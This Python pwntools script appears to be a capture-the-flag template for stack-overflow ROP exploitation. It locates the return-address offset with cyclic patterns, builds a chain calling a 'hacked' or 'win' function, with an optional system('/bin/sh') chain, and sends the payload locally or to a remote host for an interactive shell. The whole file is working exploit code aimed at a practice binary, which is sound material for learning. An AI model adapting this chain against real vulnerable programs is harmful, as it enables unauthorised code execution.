#!/usr/bin/env python3
from pwn import *
import sys

# ===========================================================
#                AUTO ROP EXPLOITATION SCRIPT
#                       Made by N0styx
# ===========================================================

exe = './chall'
# Check if binary exists
if not os.path.exists(exe):
    error(f"Binary {exe} not found.")

# Load ELF context
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info' 

# ===========================================================
#                    CONFIGURATION & GDB
# ===========================================================

gdbscript = '''
init-gef
continue
'''.format(**locals())

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        if len(sys.argv) < 3:
            error("Usage: python3 exploit.py REMOTE <HOST> <PORT>")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# ===========================================================
#                     EXPLOITATION LOGIC
# ===========================================================

def find_ip(payload):
    p = process(exe, level='warn')
    p.sendlineafter(b':', payload) # <--- ADJUST THIS TRIGGER
    p.wait()
    # Auto-detect arch for offset calculation
    if context.arch == 'amd64':
        ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    else:
        ip_offset = cyclic_find(p.corefile.pc)
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# ===========================================================
#                         MAIN
# ===========================================================

if __name__ == "__main__":

    # --- 1. FUZZING / OFFSET FINDING ---
    offset = -1
    if args.FUZZ:
        offset = find_ip(cyclic(200)) # Adjust cyclic size if needed
        info(f"Offset found: {offset}")
        sys.exit()
    else:
        # Put the offset here once found to save time
        offset = 40  # <--- REPLACE THIS AFTER RUNNING 'FUZZ'

    # Start program
    io = start()

    # --- 2. ROP CHAIN CONSTRUCTION ---
    
    # Initialize ROP object
    rop = ROP(elf)

    # OPTIONAL: Add a 'ret' gadget for Stack Alignment (often needed for x64/Ubuntu)
    # ret = rop.find_gadget(['ret'])[0]
    # rop.raw(ret)

    # --- METHOD A: Calling a function by name (Your request) ---
    # This assumes a function named 'hacked' exists in the binary
    try:
        # This is the "magic" syntax: rop.functionName(arg1, arg2)
        # rop.hacked(0xdeadbeefdeadbeef, 0xc0debabec0debabe)
        
        # Alternatively, the explicit way:
        rop.call(elf.symbols['hacked'], [0xdeadbeef, 0xc0debabe])
    except Exception as e:
        warn(f"Could not add 'hacked' function to ROP: {e}")
        # fallback to standard ret2win if hacked doesn't exist
        # rop.call(elf.symbols['win']) 

    # --- METHOD B: Build chain manually (Example) ---
    # rop.system(next(elf.search(b'/bin/sh')))
    
    # Print the generated ROP chain for debugging
    print(rop.dump())

    # --- 3. PAYLOAD GENERATION ---
    
    # Build the payload using flat()
    # This automatically pads up to 'offset' and appends the ROP chain
    payload = flat({
        offset: rop.chain()
    })

    # Save the payload to file (useful for debugging with external tools)
    write('payload', payload)

    # Send the payload
    io.sendlineafter(b':', payload)

    # Get Shell
    io.interactive()